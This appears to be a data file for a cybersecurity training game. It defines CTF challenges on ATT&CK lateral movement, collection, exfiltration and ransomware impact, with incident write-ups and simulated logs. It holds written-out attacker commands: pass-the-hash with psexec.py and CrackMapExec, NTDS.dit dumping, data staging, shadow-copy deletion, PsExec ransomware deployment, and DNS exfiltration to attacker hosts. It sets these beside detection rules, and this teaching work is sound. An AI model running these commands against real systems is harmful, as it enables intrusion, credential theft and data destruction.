TargetImage: C:\\Windows\\System32\\lsass.exe
GrantedAccess: 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
CallTrace: ntdll.dll|kernelbase.dll|m64.exe

# Detection fired — EDR blocked LSASS read attempt
# Attacker pivoted to procdump.exe (signed Microsoft binary) — bypassed block

Fragment-3: DUMP}`,
      },
      dirs: {
        "/": [{ name: "cred-dump", isDir: true }],
        "/cred-dump": [
          { name: "mimikatz-output.txt", isDir: false },
          { name: "ntlm-hashes.txt", isDir: false },
          { name: "sysmon-detection.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/cred-dump/mimikatz-output.txt", value: "FLAG{TA0006_", label: "Fragment 1 — Mimikatz Output" },
        { trigger: "/cred-dump/ntlm-hashes.txt", value: "M1M1K4TZ_", label: "Fragment 2 — NTLM Hashes" },
        { trigger: "/cred-dump/sysmon-detection.txt", value: "DUMP}", label: "Fragment 3 — Sysmon Detection" },
      ],
    },
  },

  // ─── mitre-09: Lateral Movement ──────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Colonial Pipeline HQ", location: "Alpharetta, Georgia", era: "2021", emoji: "🌐" },
    id: "mitre-09",
    order: 9,
    title: "The Spreader",
    subtitle: "TA0008 Lateral Movement — Pass-the-Hash across the network",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-09", name: "Lateral Mover", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "Lateral movement turns a single compromised host into a compromised network.",
      year: 2021,
      overview: [
        "Lateral Movement (TA0008) covers the techniques attackers use to move from their initial foothold to other systems in the network. The goal is to reach high-value targets: domain controllers, file servers, OT/ICS systems, databases, and backup systems.",
        "Core techniques: T1550.002 — Pass-the-Hash (use NTLM hash directly without cracking), T1550.003 — Pass-the-Ticket (use stolen Kerberos tickets), T1021.001 — Remote Desktop Protocol, T1021.002 — SMB/Windows Admin Shares, T1080 — Taint Shared Content (poison file shares to spread malware).",
        "Pass-the-Hash (PtH) is particularly effective because it uses the NTLM hash directly — no password cracking required. An attacker with an admin NTLM hash can authenticate to any system where that account has admin rights, using net use, wmiexec, or Impacket's psexec.py.",
      ],
      technical: {
        title: "Lateral Movement Detection — Network and Host",
        body: [
          "Network detection: lateral movement generates distinct patterns — multiple systems authenticating from the same source IP in a short time window, SMB connections to ADMIN$ or C$ shares outside business hours, authentication to systems the source account has never accessed before. NDR (Network Detection and Response) tools like Darktrace detect these behavioral anomalies.",
          "Host detection: Event ID 4624 (Logon Success) with Logon Type 3 (Network) and NtLmSsp authentication (NTLM, not Kerberos) indicates PtH. In modern environments, network logons should use Kerberos — pure NTLM network logons are a red flag. Sysmon Event ID 3 (network connection) from administrative tools (net.exe, wmiexec) to internal hosts confirms lateral movement.",
        ],
        codeExample: {
          label: "Pass-the-Hash detection and defense",
          code: `# ATTACKER: Pass-the-Hash via Impacket
python3 psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 acme/Administrator@192.168.1.10

# ATTACKER: PtH via CrackMapExec — spray across subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# DEFENDER: Detect PtH — Event ID 4624, Logon Type 3, NTLM auth
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4624 -and
  $_.Message -match "Logon Type:\\s+3" -and
  $_.Message -match "NTLM"
}

# DEFENDER: Restrict NTLM — force Kerberos for all network auth
# Group Policy: Network Security — Restrict NTLM: Incoming NTLM Traffic → Deny All
# This forces all lateral movement to use Kerberos (detectable via Event 4768/4769)`,
        },
      },
      incident: {
        title: "Colonial Pipeline — DarkSide Ransomware Lateral Movement (2021)",
        when: "May 7, 2021",
        where: "Colonial Pipeline, Alpharetta, Georgia — 45% of US East Coast fuel supply",
        impact: "$4.4M ransom paid; 5-day pipeline shutdown; TSA Security Directives mandate MFA + OT/IT segmentation for US pipeline operators",
        body: [
          "DarkSide ransomware operators gained initial access to Colonial Pipeline through a compromised VPN account with a leaked password — the account had no MFA. From there, they moved laterally through the IT network using stolen credentials, reached the billing and business systems, and deployed ransomware. Colonial shut down the 5,500-mile pipeline preemptively out of concern the OT network might also be compromised — a conservative decision that created the US East Coast fuel shortage.",
          "The lateral movement from a single compromised VPN account to the systems that disrupted 45% of US East Coast fuel supply took hours — not days. The absence of network segmentation between IT and OT, combined with credential reuse across systems, enabled the rapid spread. The VPN account had been inactive but remained enabled — it had been used months earlier by an employee who was no longer at the company.",
          "The Colonial Pipeline attack had direct regulatory consequences. The Transportation Security Administration issued Security Directive Pipeline-2021-01 in May 2021 and Pipeline-2021-02 in July 2021, mandating MFA for all remote access, network segmentation between IT and OT environments, and annual cybersecurity assessments for critical pipeline operators — the first mandatory cybersecurity regulations for US pipeline infrastructure. The $4.4M ransom payment was partially recovered in June 2021 — DOJ seized $2.3M from a Bitcoin wallet used by DarkSide, the first major federal cryptocurrency seizure from a ransomware group. CISA's subsequent Emergency Directive 22-02 (January 2022) required MFA across all federal civilian executive branch agencies for remote access — a policy directly descended from Colonial Pipeline's demonstration of what a single set of compromised VPN credentials without MFA can achieve.",
        ],
      },
      diagram: {
        nodes: [
          { label: "DarkSide", sub: "RaaS affiliate, Eastern Europe", type: "attacker" },
          { label: "Stolen VPN Creds + PtH", sub: "no MFA, NTLM lateral movement", type: "system" },
          { label: "Colonial Pipeline IT Network", sub: "billing and business systems", type: "victim" },
          { label: "Pipeline Shutdown", sub: "$4.4M ransom + 5-day outage", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "NotPetya demonstrates catastrophic lateral movement at global scale" },
        { year: 2021, event: "Colonial Pipeline — VPN + PtH lateral movement shuts East Coast fuel", highlight: true },
        { year: 2022, event: "CISA Emergency Directive — MFA required for all remote access in FCEB" },
        { year: 2023, event: "Zero Trust segmentation prevents lateral movement in >60% of enterprises" },
      ],
      keyTakeaways: [
        "Pass-the-Hash uses NTLM hashes directly — no password cracking needed",
        "Restrict NTLM: force Kerberos for all network auth — makes PtH fail",
        "Event ID 4624 Logon Type 3 + NtLmSsp = PtH indicator",
        "Network segmentation + MFA on VPN stops lateral movement at the perimeter",
      ],
      references: [
        { title: "ATT&CK T1550.002 Pass-the-Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
        { title: "Colonial Pipeline CISA Report", url: "https://www.cisa.gov/news-events/news/attack-colonial-pipeline-what-we-know" },
      ],
    },
    ctf: {
      scenario: "An attacker moved laterally through the network after gaining initial access. Three network logs document the lateral movement chain. Collect the flag fragments.",
      hint: "Lateral movement logs are in /lateral-move. Read each log file.",
      hints: [
        "List /lateral-move to find the log files.",
        "The PtH log contains the first fragment.",
        "Read smb-spread.log and dc-access.log for the remaining fragments.",
      ],
      files: {
        "/lateral-move/pth-log.txt": `# Pass-the-Hash Authentication Log
# Event ID 4624, Logon Type 3, NtLmSsp

Source IP: 192.168.1.47 (WORKSTATION-047, initial compromise)
Targets and results:
  192.168.1.10 (FS01)  — NTLM hash Admin: SUCCESS
  192.168.1.20 (FS02)  — NTLM hash Admin: SUCCESS
  192.168.1.30 (DB01)  — NTLM hash Admin: SUCCESS
  192.168.1.1  (DC01)  — NTLM hash Admin: SUCCESS

Fragment-1: FLAG{TA0008_`,
        "/lateral-move/smb-spread.log": `# SMB Admin Share Access Log
# Source: 192.168.1.47 using stolen admin hash

\\\\FS01\\ADMIN$    — copy payload.exe → C:\\Windows\\Temp\\svc.exe
\\\\FS02\\C$       — copy payload.exe → C:\\ProgramData\\svc.exe
\\\\DB01\\ADMIN$   — copy payload.exe → C:\\Windows\\Temp\\svc.exe

# PsExec remote execution to trigger payload on each host

Fragment-2: L4T_MOV_`,
        "/lateral-move/dc-access.log": `# Domain Controller Access — CRITICAL
# 192.168.1.47 → 192.168.1.1 (DC01) via PtH

Session: jsmith (DA) — NTLM network logon
Commands:
  nltest /dclist:acme.local          (domain recon)
  net group "Domain Admins" /domain  (identify DA accounts)
  ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q (NTDS.dit dump)

Fragment-3: PTH}`,
      },
      dirs: {
        "/": [{ name: "lateral-move", isDir: true }],
        "/lateral-move": [
          { name: "pth-log.txt", isDir: false },
          { name: "smb-spread.log", isDir: false },
          { name: "dc-access.log", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/lateral-move/pth-log.txt", value: "FLAG{TA0008_", label: "Fragment 1 — PtH Log" },
        { trigger: "/lateral-move/smb-spread.log", value: "L4T_MOV_", label: "Fragment 2 — SMB Spread" },
        { trigger: "/lateral-move/dc-access.log", value: "PTH}", label: "Fragment 3 — DC Access" },
      ],
    },
  },

  // ─── mitre-10: Discovery + Collection ────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "APT29 Operations", location: "Eastern Europe", era: "2020–Present", emoji: "🔎" },
    id: "mitre-10",
    order: 10,
    title: "The Cartographer",
    subtitle: "TA0007 + TA0009 Discovery and Collection — mapping and harvesting",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-10", name: "Intelligence Collector", emoji: "🔎" },
    challengeType: "ctf",
    info: {
      tagline: "Discovery maps the treasure. Collection bags it. Both happen before exfiltration.",
      year: 2020,
      overview: [
        "Discovery (TA0007) and Collection (TA0009) are often executed in parallel. Discovery identifies what exists on the compromised network: T1083 — File and Directory Discovery, T1082 — System Information Discovery, T1016 — System Network Configuration Discovery, T1018 — Remote System Discovery (network scanning from inside the network).",
        "Collection (TA0009) harvests the valuable data once it's located: T1005 — Data from Local System, T1039 — Data from Network Shared Drive, T1114 — Email Collection (exporting mailbox data), T1119 — Automated Collection (scripts that search for and archive files matching patterns like *.docx, *.xlsx, *.pst).",
        "APT actors spend significant time in the discovery and collection phase — understanding the organization's network topology, identifying high-value data repositories, and staging data for exfiltration in small, compressed, encrypted archives that are less likely to trigger DLP alerts.",
      ],
      technical: {
        title: "Discovery and Collection Patterns",
        body: [
          "Network discovery from inside: `net view /domain`, `nltest /dclist`, `arp -a`, `netscan.exe` — these commands map the internal network topology. Detect via Sysmon process creation events for net.exe, nltest.exe, and arp.exe combined with unusual source accounts.",
          "Automated collection scripts search for document file types (*.docx, *.xlsx, *.pptx, *.pdf), compress them (7zip, WinRAR), and stage them in a temp directory for exfiltration. Detect via DLP rules monitoring file access volume spikes, compression utility execution, and large-volume file reads from unusual accounts.",
        ],
        codeExample: {
          label: "Discovery and collection automation (attacker pattern + detection)",
          code: `# ATTACKER: Network discovery
net view /domain              # List domain computers
nltest /dclist:acme.local     # Find domain controllers
nmap -sn 192.168.0.0/16      # Sweep internal network ranges

# ATTACKER: Automated file collection (PowerShell)
Get-ChildItem -Path \\\\fileserver\\shares -Recurse -Include *.docx,*.xlsx,*.pdf |
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-90)} |
  Copy-Item -Destination C:\\Temp\\staging\\

# Compress and encrypt staging directory
7za.exe a -p"C0ll3ct!" C:\\Temp\\data.7z C:\\Temp\\staging\\

# DEFENDER: Detect mass file access (DLP / SIEM rule)
# Alert: single account reads >500 files in <5 minutes
# Alert: 7zip/WinRAR execution from temp directory with password flag`,
        },
      },
      incident: {
        title: "APT29 — M365 Email Collection via Legacy OAuth App (2023–2024)",
        when: "November 2023 – January 2024 (disclosed)",
        where: "Microsoft corporate email environment — senior leadership, security team, legal staff",
        impact: "Microsoft senior leadership emails stolen; CSRB investigation; Microsoft removes all legacy OAuth apps; Microsoft security culture cited by CSRB as contributing factor",
        body: [
          "APT29 (Midnight Blizzard, SVR) accessed Microsoft's corporate email environment by exploiting a legacy test OAuth application that had been provisioned with excessive permissions and never removed. Using password spray to compromise the test account, they leveraged the OAuth application's Microsoft Graph API access to query specific mailboxes for keywords related to APT29's own operations — a counter-intelligence collection operation targeting the company that had been most publicly documenting their techniques.",
          "The collection was targeted and automated: APT29 queried the Microsoft Graph API for emails containing terms like 'Midnight Blizzard,' 'Cozy Bear,' 'APT29,' and references to Microsoft's own threat intelligence reports about SVR operations. This is T1114.002 (Remote Email Collection) combined with T1119 (Automated Collection) — a highly efficient, API-driven harvest requiring no additional credential theft beyond the initial OAuth app compromise.",
          "Microsoft's public disclosure of the breach on January 12, 2024, was unusually candid, acknowledging that APT29 had accessed emails of senior leadership, cybersecurity team members, and legal staff. Microsoft's response included revoking all legacy OAuth applications with excessive permissions and tightening Microsoft Graph API permission grants. The Cybersecurity Review Board (CSRB) opened an investigation and published an April 2024 report that explicitly identified Microsoft's security culture and legacy architecture decisions as contributing factors to the breach — an unusually pointed assessment of a major technology company's security practices by a US government oversight body. The report recommended Microsoft prioritize security above all other product features and make the architectural changes necessary to prevent similar breaches — a directive that drove Microsoft's 'Secure Future Initiative' and significant engineering security investments in 2024.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT29", sub: "Midnight Blizzard (SVR)", type: "attacker" },
          { label: "Legacy OAuth App", sub: "excessive Graph API permissions", type: "system" },
          { label: "Microsoft Leadership Email", sub: "targeted keyword collection", type: "victim" },
          { label: "Counter-Intel Harvest", sub: "emails about APT29 itself", type: "result" },
        ],
      },
      timeline: [
        { year: 2014, event: "APT29 begins long-term discovery operations against US government" },
        { year: 2020, event: "APT29 maps SolarWinds customer network prior to exfiltration" },
        { year: 2024, event: "Microsoft discloses APT29 email collection via legacy OAuth app", highlight: true },
        { year: 2024, event: "Microsoft revokes all legacy OAuth apps and tightens Graph API permissions" },
      ],
      keyTakeaways: [
        "Discovery uses built-in tools (net.exe, nltest, arp) — monitor process creation for these",
        "Automated collection: alert on >500 file reads in <5 minutes from a single account",
        "Audit OAuth application permissions — legacy apps with excessive Graph API access are high risk",
        "Email keyword searches by unauthorized apps are detectable via Microsoft 365 audit logs",
      ],
      references: [
        { title: "ATT&CK TA0007 Discovery", url: "https://attack.mitre.org/tactics/TA0007/" },
        { title: "Microsoft APT29 Disclosure (Jan 2024)", url: "https://msrc.microsoft.com/blog/2024/01/microsoft-actions-following-attack-by-nation-state-actor-midnight-blizzard/" },
      ],
    },
    ctf: {
      scenario: "APT29 artifacts were found on a compromised email server. Three collection log files show their discovery and data harvesting operation. Collect the fragments.",
      hint: "Collection artifacts are in /apt29-op. Read each log file.",
      hints: [
        "List /apt29-op to find the operation files.",
        "The discovery log contains the first fragment.",
        "Read collection.log and staging.txt for the remaining fragments.",
      ],
      files: {
        "/apt29-op/discovery.log": `# Network Discovery Log — APT29 Midnight Blizzard

net view /domain → ACME.LOCAL (847 computer objects)
nltest /dclist:acme.local → DC01, DC02, DC03
net group "Domain Admins" /domain → 6 members identified
Identified targets: Exchange servers, SharePoint, file servers

Fragment-1: FLAG{TA0009_`,
        "/apt29-op/collection.log": `# Email Collection Log — Microsoft Graph API

OAuth app: "LegacyTestApp2018" — permissions: Mail.Read (all users)
Query: mailbox:ceo@acme.com keywords:["APT29","Midnight Blizzard","threat actor"]
Results: 847 emails matching keywords
Query: mailbox:ciso@acme.com keywords:["Russia","SVR","Cozy Bear"]
Results: 312 emails matching keywords

Total collected: 1,159 targeted emails

Fragment-2: C0LL3CT_`,
        "/apt29-op/staging.txt": `# Data Staging — Pre-Exfiltration

Collected emails archived: emails.7z (password: xK9#mP2$nQ7!)
Archive size: 247MB (compressed from 1.4GB)
Staging location: C:\\Windows\\Temp\\WinUpdate\\

Exfiltration method: HTTPS to secure-update-cdn.com (attacker C2)
Scheduled: 2024-01-14 02:30 UTC (off-hours, low traffic)

Fragment-3: APT29}`,
      },
      dirs: {
        "/": [{ name: "apt29-op", isDir: true }],
        "/apt29-op": [
          { name: "discovery.log", isDir: false },
          { name: "collection.log", isDir: false },
          { name: "staging.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/apt29-op/discovery.log", value: "FLAG{TA0009_", label: "Fragment 1 — Discovery" },
        { trigger: "/apt29-op/collection.log", value: "C0LL3CT_", label: "Fragment 2 — Collection" },
        { trigger: "/apt29-op/staging.txt", value: "APT29}", label: "Fragment 3 — Staging" },
      ],
    },
  },

  // ─── mitre-11: Exfiltration ───────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Equifax HQ", location: "Atlanta, Georgia", era: "2017", emoji: "📤" },
    id: "mitre-11",
    order: 11,
    title: "The Data Smuggler",
    subtitle: "TA0010 Exfiltration — getting data out without triggering DLP",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-11", name: "Data Smuggler", emoji: "📤" },
    challengeType: "ctf",
    info: {
      tagline: "Collection without exfiltration is a library. Exfiltration is the theft.",
      year: 2017,
      overview: [
        "Exfiltration (TA0010) covers the techniques attackers use to steal collected data from the target network. The challenge for attackers is moving large volumes of data without triggering network DLP, bandwidth monitoring, or anomaly detection systems.",
        "Core techniques: T1048 — Exfiltration Over Alternative Protocol (DNS tunneling, ICMP tunneling, HTTP/S to attacker-controlled domains), T1041 — Exfiltration Over C2 Channel (sending data through the same encrypted channel used for command and control), T1567 — Exfiltration Over Web Service (uploading to Dropbox, Google Drive, or Mega.nz to blend with legitimate cloud traffic).",
        "Exfiltration timing matters: sophisticated actors exfiltrate slowly over days or weeks to stay below anomaly detection thresholds. DNS tunneling can be extremely slow but is almost never blocked by enterprise firewalls — making it the preferred covert channel for long-term exfiltration.",
      ],
      technical: {
        title: "Exfiltration Detection — Network Layer",
        body: [
          "DNS exfiltration detection (T1048.003): DNS queries with unusually long subdomain labels (>50 characters), high query frequency from a single host, queries to domains not seen before by that host, TXT record queries (unusual for workstations). DNS exfiltration tools encode data in subdomain labels: `aGVsbG8gd29ybGQ.c2.attacker.com`.",
          "Volume-based detection: establish a baseline of daily data egress per host. Alert when a host exceeds 2x the historical average egress volume, especially outside business hours. DLP tools detect file type patterns in network traffic (Office document headers, ZIP magic bytes) on encrypted connections via TLS inspection.",
        ],
        codeExample: {
          label: "DNS exfiltration detection",
          code: `# ATTACKER: DNS tunneling exfiltration (iodine, dnscat2)
# Data encoded in subdomain: base32(chunk_of_data).attacker-c2.com
# e.g.: JBSWY3DPEBLW64TMMQQQ.exfil.attacker-ns.com

# DEFENDER: Hunt DNS exfiltration — unusually long query labels
# Zeek DNS log analysis
cat dns.log | awk '{print $10}' | awk -F'.' '{print length($1), $0}' | sort -rn | head -20

# Alert: DNS query subdomain label > 50 chars
# Alert: >1000 DNS queries/hour to same external domain from one host
# Alert: TXT record queries from workstations (rare in legitimate use)

# DEFENDER: SIEM rule — DNS exfiltration
# index=network sourcetype=dns
# | eval subdomain_len=len(mvindex(split(query,"."), 0))
# | where subdomain_len > 50
# | stats count by src_ip, query | where count > 100`,
        },
      },
      incident: {
        title: "Equifax — 76 Days of Exfiltration Undetected (2017)",
        when: "May–July 2017",
        where: "Equifax, Atlanta, Georgia — 147.9 million Americans' consumer credit records",
        impact: "$575M FTC settlement (largest data breach penalty at time); $1.4B total costs; PLA Unit 54938 indicted; SSL inspection becomes mandatory control",
        body: [
          "After exploiting the Apache Struts vulnerability (CVE-2017-5638) in mid-May 2017, attackers exfiltrated data from Equifax's systems over 76 days — nearly two and a half months — before discovery on July 29. The exfiltration went undetected because Equifax's SSL inspection certificate had expired 19 months earlier, making the network monitoring system completely blind to HTTPS-encrypted traffic leaving the network.",
          "The attackers ran 9,000 data queries over 76 days, staged results in small encrypted archives, and exfiltrated through 20 different IP addresses across 20 countries to avoid volume-based detection. The expired SSL certificate was the critical control failure — it turned the network monitoring system from an active defense into a decorative checkbox. The stolen data included names, Social Security numbers, birth dates, addresses, and driver's license numbers for 147.9 million Americans.",
          "The FTC Equifax settlement of $575M — the largest data breach penalty in US history at the time — required Equifax to implement SSL inspection with certificate management controls, mandatory vulnerability scanning with defined remediation timelines, and annual third-party security assessments. DOJ indicted four members of PLA Unit 54938 (linked to the 2015 OPM breach) for the Equifax hack in February 2020 — documenting the attack chain and exfiltration technique in the indictment. SSL inspection became a mandatory control in NIST SP 800-53 rev 5 baselines specifically because Equifax demonstrated that monitoring systems blind to encrypted traffic provide no protection against the vast majority of modern exfiltration, which uses HTTPS. The case is now cited in every major data breach regulatory framework as the canonical example of a monitoring control rendered ineffective by operational neglect.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Unknown Threat Actor", sub: "APT — CVE-2017-5638", type: "attacker" },
          { label: "HTTPS Exfil — 20 IPs", sub: "small chunks, distributed", type: "system" },
          { label: "Equifax Consumer DB", sub: "147.9M Americans' PII", type: "victim" },
          { label: "76-Day Undetected Theft", sub: "expired SSL cert = blind monitoring", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "Equifax breach — 76 days of exfiltration; expired SSL cert enables invisibility", highlight: true },
        { year: 2019, event: "FTC Equifax settlement — $575M largest data breach penalty at the time" },
        { year: 2020, event: "DOJ indicts 4 PLA members for Equifax breach (Unit 61398 linked)" },
        { year: 2022, event: "SSL inspection becomes mandatory control in NIST SP 800-53 baselines" },
      ],
      keyTakeaways: [
        "SSL inspection is a critical exfiltration detection control — expired certs = blind monitoring",
        "DNS tunneling bypasses most firewalls — monitor for long subdomain labels and TXT queries",
        "Equifax exfiltrated for 76 days — baseline egress volume and alert on deviations",
        "Distribute exfiltration across many IPs to evade volume-based detection (as attackers do)",
      ],
      references: [
        { title: "ATT&CK TA0010 Exfiltration", url: "https://attack.mitre.org/tactics/TA0010/" },
        { title: "Equifax FTC Settlement", url: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" },
      ],
    },
    ctf: {
      scenario: "Equifax-style breach artifacts show exfiltration in progress. Three log files document the data theft — the SSL blind spot, the chunked exfil, and the detection that came too late. Collect the flag.",
      hint: "Exfiltration logs are in /exfil-op. Read each file.",
      hints: [
        "List /exfil-op to find the log files.",
        "The SSL inspection log reveals the blind spot — and the first fragment.",
        "Read exfil-traffic.log and detection.txt for the remaining fragments.",
      ],
      files: {
        "/exfil-op/ssl-blind-spot.txt": `# SSL Inspection Status Report
# Network Monitoring System — Equifax Corp

SSL Inspection Certificate Status:
  Issuer: DigiCert SSL Inspection CA
  Expiry: 2016-01-15 (EXPIRED — 19 months ago)
  Status: EXPIRED — SSL inspection DISABLED

Impact: All HTTPS traffic (ports 443, 8443) is OPAQUE to monitoring system.
Monitoring system is BLIND to encrypted exfiltration.

Fragment-1: FLAG{TA0010_`,
        "/exfil-op/exfil-traffic.log": `# Reconstructed Exfiltration Traffic (post-incident, from firewall logs)

Date range: 2017-05-13 to 2017-07-29 (76 days)

Destination IPs (20 unique): 195.123.x.x, 94.177.x.x, 185.220.x.x ... [+17 more]
Protocol: HTTPS (port 443) — content was ENCRYPTED (SSL blind spot)
Volume pattern: 200-500MB per day per IP — below single-host anomaly threshold
Total exfiltrated: ~47GB (147.9M records compressed)

Fragment-2: 3XF1L_`,
        "/exfil-op/detection.txt": `# Intrusion Detection Report — July 29, 2017

Detection trigger: Routine network device check flagged unfamiliar binary on ADM portal
IR team investigated → discovered active exfiltration sessions still in progress
Breach duration at detection: 76 days (2017-05-13 to 2017-07-29)

Post-mortem finding: SSL inspection cert expired Jan 2016; not renewed; never caught.
147.9M Americans' data stolen.

Fragment-3: 76D4YS}`,
      },
      dirs: {
        "/": [{ name: "exfil-op", isDir: true }],
        "/exfil-op": [
          { name: "ssl-blind-spot.txt", isDir: false },
          { name: "exfil-traffic.log", isDir: false },
          { name: "detection.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/exfil-op/ssl-blind-spot.txt", value: "FLAG{TA0010_", label: "Fragment 1 — SSL Blind Spot" },
        { trigger: "/exfil-op/exfil-traffic.log", value: "3XF1L_", label: "Fragment 2 — Exfil Traffic" },
        { trigger: "/exfil-op/detection.txt", value: "76D4YS}", label: "Fragment 3 — Detection" },
      ],
    },
  },

  // ─── mitre-12: Impact ─────────────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Kaseya VSA Attack", location: "Miami, Florida", era: "2021", emoji: "💥" },
    id: "mitre-12",
    order: 12,
    title: "The Detonator",
    subtitle: "TA0040 Impact — ransomware deployment at supply chain scale",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-12", name: "ATT&CK Master", emoji: "⚔️" },
    challengeType: "ctf",
    info: {
      tagline: "Impact is the end of the kill chain. For defenders, it is also the beginning of recovery.",
      year: 2021,
      overview: [
        "Impact (TA0040) is the final tactic — the attacker's objective is achieved. Impact techniques include: T1486 — Data Encrypted for Impact (ransomware), T1485 — Data Destruction (wiper malware), T1491 — Defacement, T1498 — Network Denial of Service, T1529 — System Shutdown/Reboot (to trigger damage at scale).",
        "Ransomware (T1486) has become the dominant impact technique because it monetizes access directly. Modern ransomware operations are multi-stage: pre-ransomware reconnaissance and data exfiltration (for double extortion), deployment of the encryptor across all accessible systems simultaneously, and ransom note delivery.",
        "Supply chain ransomware (T1195.002) amplifies impact by targeting managed service providers (MSPs) — a single compromised MSP can propagate ransomware to hundreds of customer organizations simultaneously. Kaseya VSA demonstrated this at scale: one compromised RMM platform, 1,500 downstream victims.",
      ],
      technical: {
        title: "Ransomware Defense — Before and After Encryption",
        body: [
          "Pre-encryption detection: ransomware operators typically exfiltrate data (for double extortion) before encrypting. Large outbound transfers are detectable. The encryption process itself is detectable: high-volume file modification events (Event ID 4663 — file write), file extension changes (.docx → .locked), shadow copy deletion (vssadmin delete shadows /all).",
          "Backup and recovery: the single most effective ransomware defense is immutable backups — backups the ransomware cannot reach or delete. 3-2-1 rule: 3 copies, 2 media types, 1 offsite. Air-gapped or cloud-immutable backups (Azure Blob Storage immutability, AWS S3 Object Lock) survive ransomware because they are inaccessible from the compromised network.",
        ],
        codeExample: {
          label: "Ransomware detection and backup protection",
          code: `# ATTACKER: Shadow copy deletion (pre-encryption, always)
vssadmin.exe delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No

# ATTACKER: Ransomware deployment via PsExec to all discovered hosts
psexec.exe @targets.txt -s cmd.exe /c "C:\\Temp\\encryptor.exe --fast --key <pubkey>"

# DEFENDER: Detect VSS deletion (Event ID 4688 — process creation)
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4688 -and $_.Message -match "vssadmin.*delete|bcdedit.*recoveryenabled"
}

# DEFENDER: Immutable backups — AWS S3 Object Lock
aws s3api put-bucket-object-lock-configuration \
  --bucket acme-backups-prod \
  --object-lock-configuration '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"COMPLIANCE","Days":30}}}'`,
        },
      },
      incident: {
        title: "Kaseya VSA — REvil Supply Chain Ransomware (July 4, 2021)",
        when: "July 2–5, 2021",
        where: "Kaseya VSA (Miami FL) → ~50 MSPs → 1,500 businesses globally across 17 countries",
        impact: "$70M ransom demand; 800 Coop grocery stores closed; Biden-Putin direct call; FBI possessed universal decryption key for 3 weeks before disclosing to victims",
        body: [
          "REvil ransomware operators exploited a zero-day in Kaseya VSA (a Remote Monitoring and Management platform used by managed service providers) to push a malicious 'update' to all VSA-connected agents. The update deployed ransomware to every endpoint managed by approximately 50 MSPs running Kaseya VSA — reaching approximately 1,500 businesses across 17 countries. The attack was timed for July 4th weekend, when IT staff coverage was minimal and change management controls were relaxed.",
          "The ransomware encrypted all files simultaneously across thousands of organizations within hours. Sweden's Coop grocery chain closed 800 stores because their point-of-sale systems ran on a Kaseya-managed MSP. The entire ATT&CK kill chain — from initial Kaseya VSA exploitation (T1195 Supply Chain Compromise) to ransomware detonation (T1486 Data Encrypted for Impact) — executed in under 48 hours. The $70M ransom demand was addressed to Kaseya rather than to individual victims, reflecting the scale of the supply chain compromise.",
          "The Kaseya attack triggered the first direct US government engagement with ransomware operators at the presidential level: President Biden called Russian President Putin on July 9, 2021, specifically raising the Kaseya attack. REvil's infrastructure went offline shortly after — widely attributed to US government offensive action, though never officially acknowledged. The FBI held the universal decryption key for Kaseya victims for three weeks before providing it to Kaseya in late July 2021, generating significant controversy about delayed victim notification. The case accelerated adoption of immutable backup solutions: S3 Object Lock and Azure Immutable Storage deployments grew significantly in the MSP sector in H2 2021, and CISA's StopRansomware guidance expanded to make immutable offline backups a primary recommendation — acknowledging that while prevention was ideal, survivable recovery was essential when prevention failed at the supply chain level.",
        ],
      },
      diagram: {
        nodes: [
          { label: "REvil", sub: "ransomware-as-a-service operator", type: "attacker" },
          { label: "Kaseya VSA Zero-Day", sub: "T1195 supply chain → T1486 ransomware", type: "system" },
          { label: "1,500 Businesses", sub: "50 MSPs × 30 customers each", type: "victim" },
          { label: "$70M Ransom / Global Outage", sub: "Coop 800 stores closed", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "WannaCry — first global ransomware supply chain (NSA EternalBlue)" },
        { year: 2021, event: "Colonial Pipeline — single org ransomware shuts US fuel supply" },
        { year: 2021, event: "Kaseya VSA — supply chain ransomware hits 1,500 orgs simultaneously", highlight: true },
        { year: 2022, event: "CISA releases ransomware guide — backup immutability becomes baseline requirement" },
      ],
      keyTakeaways: [
        "Detect ransomware pre-encryption: VSS deletion, large file writes, extension changes",
        "Immutable backups (S3 Object Lock, Azure Immutable Storage) survive ransomware",
        "Shadow copy deletion (vssadmin delete shadows) is a universal ransomware pre-step — alert on it",
        "MSP supply chain attacks are force multipliers — vet your RMM vendors' security posture",
      ],
      references: [
        { title: "ATT&CK TA0040 Impact", url: "https://attack.mitre.org/tactics/TA0040/" },
        { title: "Kaseya VSA Attack Analysis (CISA)", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-232a" },
      ],
    },
    ctf: {
      scenario: "REvil ransomware artifacts were recovered from a Kaseya VSA victim. Three files document the final impact phase — VSS deletion, encryption, and the ransom note. Collect the flag to complete the ATT&CK kill chain.",
      hint: "Impact artifacts are in /ransomware-op. Read each file to complete the chain.",
      hints: [
        "List /ransomware-op to find the final artifacts.",
        "The VSS deletion log contains the first fragment.",
        "The ransom note contains the final fragment.",
      ],
